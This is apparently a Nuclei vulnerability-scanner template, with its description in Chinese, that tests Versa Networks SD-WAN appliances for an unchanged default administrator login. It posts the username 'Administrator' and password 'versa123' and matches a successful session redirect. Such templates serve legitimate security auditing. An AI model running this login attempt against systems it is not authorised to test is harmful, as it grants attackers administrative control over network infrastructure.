id: versa-default-login

info:
  name: Versa Networks SD-WAN Application 默认口令登录（弱口令）
  author: davidmckennirey
  severity: high
  description: 该模板通过尝试 Versa Networks SD-WAN Application 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://versa-networks.com/products/sd-wan.php
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 2
  tags: default-login,versa,sdwan,vuln

http:
  - raw:
      - |
        GET /versa/login.html HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
      - |
        POST /versa/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{user}}&password={{pass}}&sso=systemRadio

    attack: pitchfork
    payloads:
      user:
        - Administrator
      pass:
        - versa123

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 302'
          - "contains(tolower(header_2), 'jsessionid')"
          - "contains(tolower(header_2), 'location: /versa/index.html')"
        condition: and

      - type: dsl
        dsl:
          - "contains(tolower(header_2), '/login?error=true')"
          - "contains(tolower(header_2), '/login?tokenmissingerror=true')"
        negative: true
